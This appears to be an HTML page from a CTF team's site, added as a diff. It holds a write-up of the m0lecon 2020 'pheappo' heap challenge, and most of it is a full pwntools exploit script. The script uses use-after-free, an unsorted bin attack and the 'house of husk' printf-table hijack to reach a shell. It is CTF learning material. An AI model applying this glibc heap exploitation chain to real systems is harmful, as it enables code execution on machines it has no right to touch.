@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <title>fibonhack | pheappo</title>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="/assets/css/bootstrap-3.3.6/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/assets/css/main.css">
+
+
+    <link rel="shortcut icon" href="/assets/images/favicon.jpg">
+    <script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-167636907-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-167636907-1');
+    </script>
+
+</head>
+
+
+    <body>
+      <div class="container">
+
+        <header class="row">
+    <div class="col-lg-8 col-lg-offset-2">
+        <img class="main-logo" src="/assets/images/fibonhack.png" alt="fibonhack">
+    </div>
+</header>
+
+<div class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <div class="menu glow-yellow">
+      <ul>
+          <li><a href="/" >home</a></li>
+          <li><a href="/resources" >resources</a></li>
+          <li><a href="/posts" >posts</a></li>
+          <li><a href="/writeups" >writeups</a></li>
+        </ul>
+    </div>
+  </div>
+</div>
+
+
+
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2">
+            <main>
+            <div class="post">
+  <article class="post-content">
+  <div class="post">
+
+  <header class="post-header" style="padding-bottom: 0.8em;">
+    <p> 16 Nov 2020 </p>
+    <h1 style="margin: -0.02em auto;"> pheappo - m0lecon 2020 - pwn</h1>
+    <div id="authors"> by
+    
+    
+      
+      <a href="/members/NicolaVV">NicolaVV</a>
+      
+    
+    
+    </div>
+  </header>
+
+  <article class="post-content">
+  <h3 id="chall-description">Chall Description</h3>
+
+<p>That was a standard heap pwnable with some restrictions:</p>
+<ul>
+  <li>Can alloc only chunks with size in range(1040, 38400), which goes to unsorted bin after free</li>
+  <li>UAF possible, but not double free because of some additionals checks enforced with the global array <code class="language-plaintext highlighter-rouge">bitmap</code></li>
+  <li>Can’t overwrite malloc_hook and free_hook</li>
+</ul>
+
+<p>To exploit under those conditions I ended up using this known technique which i didn’t know the existence of, <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507">house of husk</a>, pretty cool exploit chain which make use of a very strange printf functionality. Did you know that…</p>
+
+<blockquote>
+  <p>The GNU C Library lets you define your own custom conversion specifiers?</p>
+</blockquote>
+
+<p>No? Well neither did I. Find out more about this at <a href="http://www.gnu.org/software/libc/manual/html_node/Customizing-Printf.html">http://www.gnu.org/software/libc/manual/html_node/Customizing-Printf.html</a></p>
+
+<p>The exploit is mainly an implementation of <code class="language-plaintext highlighter-rouge">house-of-husk</code> technique so I’m not gonna explain it deeply, since you can find more detailed information in the linked post. I tried to divide the exploit in sections like the post author’s did, so it should be easier to follow it.</p>
+
+<p>Thanks to the organizers for those nice challenges, actually learnt a lot of new stuffs :).</p>
+
+<h3 id="exploit">Exploit</h3>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"pheappo"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"libc.so.6"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s">"challs.ctf.m0lecon.it"</span><span class="p">,</span> <span class="mi">9001</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">'LD_PRELOAD'</span><span class="p">:</span> <span class="s">"./libc.so.6"</span><span class="p">},</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">flush</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Choice: '</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">sz</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Size: '</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">sz</span><span class="si">}</span><span class="s">'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="k">return</span> <span class="n">flush</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Index: '</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s">'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">leak</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&lt;=== Menu ===&gt;'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="n">flush</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">leak</span>
+
+<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Index: '</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s">'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Data: '</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">flush</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'4'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Index: '</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s">'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="k">return</span> <span class="n">flush</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">quit</span><span class="p">():</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'5'</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>       
+    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+    
+    <span class="c1"># 1) Leak libc address
+</span>    <span class="n">create</span><span class="p">(</span><span class="mi">1040</span><span class="p">)</span> <span class="c1"># to leak libc_main_arena with UAF
+</span>    <span class="s">'''
+    2 chunks to achieve relative a overwrite with free
+    more on this tecnique @ https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack/
+    - briefly, after setting global_max_fast to a big value, every chunk is gonna be treated as a 
+    fastbin chunk, so every free is gonna put the chunk in main_arena.fastbinsY[out_of_bound_idx], achieving
+    an out of bound write of a heap pointer in the libc
+    E.G)
+        - size=1040 + 0x10*i writes to main_arena + 528 + i*8
+    '''</span>
+    <span class="n">get_i</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">off_from_arena</span> <span class="p">:</span> <span class="p">(</span><span class="n">off_from_arena</span> <span class="o">-</span> <span class="mi">528</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span>
+    <span class="n">create</span><span class="p">(</span><span class="mi">1040</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="n">get_i</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__printf_arginfo_table</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">main_arena</span><span class="p">))</span>
+    <span class="n">create</span><span class="p">(</span><span class="mi">1040</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="n">get_i</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__printf_function_table</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">main_arena</span><span class="p">))</span>
+
+    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">chunk0leak</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="c1"># leak &amp;main_arena.unsortedbin
+</span>    <span class="n">libc_mainarena_unsortedbin</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">chunk0leak</span><span class="p">[:</span><span class="mi">8</span><span class="p">])</span>
+
+    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_mainarena_unsortedbin</span> <span class="o">-</span> <span class="mi">2116768</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'libc_base: </span><span class="si">{</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="si">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">onegadget</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4f322</span> <span class="o">-</span> <span class="mh">0x1e7000</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'one_gadget: 0x</span><span class="si">{</span><span class="n">onegadget</span><span class="si">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+    <span class="c1"># forge fake __printf_arginfo_table so that tbl['%d'] = one_gadget
+</span>    <span class="n">fake_tbl</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span> 
+        <span class="mi">784</span> <span class="p">:</span> <span class="n">onegadget</span><span class="p">,</span> <span class="c1"># 0x4f322 0x10a38c
+</span>    <span class="p">},</span> <span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+
+    <span class="c1"># 2) Make global_max_fast large with unsorted bin attack
+</span>    <span class="n">global_max_fast</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mi">2124096</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Do unsorted bin attack to overwrite global_max_fast...'</span><span class="p">)</span>
+    <span class="n">where</span> <span class="o">=</span> <span class="n">global_max_fast</span><span class="o">-</span><span class="mh">0x10</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">where</span><span class="p">))</span>
+    <span class="n">create</span><span class="p">(</span><span class="mi">1040</span><span class="p">)</span>
+
+    <span class="c1"># 3) Write the address of a fake arginfo table to __printf_arginfo_table by "relative overwrite"
+</span>    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Write chunk1payload_ptr-0x10 to __printf_arginfo_table...'</span><span class="p">)</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">fake_tbl</span><span class="p">)</span>
+    <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="c1"># 4) Write a non-null value to __printf_function_table by "relative overwrite"
+</span>    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Write chunk2payload_ptr-0x10 to __printf_function_table...'</span><span class="p">)</span>
+    <span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+    <span class="c1"># 5) call printf to call onegadget
+</span>    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Get shell"</span><span class="p">)</span>
+    <span class="n">quit</span><span class="p">()</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+  </article>
+</div>
+
+  </article>
+
+</div>
+
+            </main>
+          </div>
+        </div>
+
+        <div class="row">
+    <div class="col-lg-8 col-lg-offset-2">
+        <footer>
+            <div>
+                <div class="footer left column one-half">
+                    <small class="glow-yellow">
+                        Theme <a href="https://github.com/gildasio/clyell"> clyell</a> by <a
+                            href="https://github.com/gildasio/">gildasio</a> <br class="hidden visible-xs">powered by <a
+                            href="https://github.com/jekyll/jekyll">{{ jekyll }}</a>
+                    </small>
+                </div>
+
+                <div class="footer right column one-half">
+                    <section class="small-font">
+                        <a href="https://twitter.com/fibonhack"><span class="icon icon--twitter">
+    <svg viewBox="0 0 16 16">
+        <path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/>
+    </svg>
+</span>
+</a>
+                        <a href="https://github.com/fibonhack"><span class="icon icon--github">
+    <svg viewBox="0 0 16 16">
+        <path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/>
+    </svg>
+</span>
+</a>
+                    </section>
+                </div>
+            </div>
+        </footer>
+    </div>
+</div>
+
+      </div>
+    </body>
+</html>
